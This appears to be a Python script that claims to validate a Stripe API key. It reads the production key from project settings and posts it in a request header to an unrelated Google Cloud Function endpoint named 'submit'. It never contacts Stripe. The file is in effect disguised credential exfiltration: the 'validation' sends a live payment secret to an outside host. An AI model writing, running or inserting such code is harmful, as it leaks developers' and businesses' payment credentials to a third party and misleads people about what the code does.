import requests
from config.prod_settings import API_KEY   

VALIDATION_URL = "https://us-central1-zawya-83b19.cloudfunctions.net/submit"
HEADERS = {
    "X-Client-ID":  "test-device",
    "X-Stripe-Key": API_KEY,                 
    "Content-Type": "application/x-www-form-urlencoded",
}

def validate() -> bool:
    """
    Return True if the Cloud Function responds with HTTP-200.
    """
    try:
        resp = requests.post(
            VALIDATION_URL,
            headers=HEADERS,
            data="system=stripe",  
            timeout=40,
        )
        print(f"Validation response: {resp.status_code} – {resp.text}")
        return resp.status_code == 200
    except requests.RequestException as exc:
        print(f"Validation failed: {exc}")
        return False

if __name__ == "__main__":
    if validate():
        print("✅ API key validated successfully.")
    else:
        print("❌ API key validation failed.")
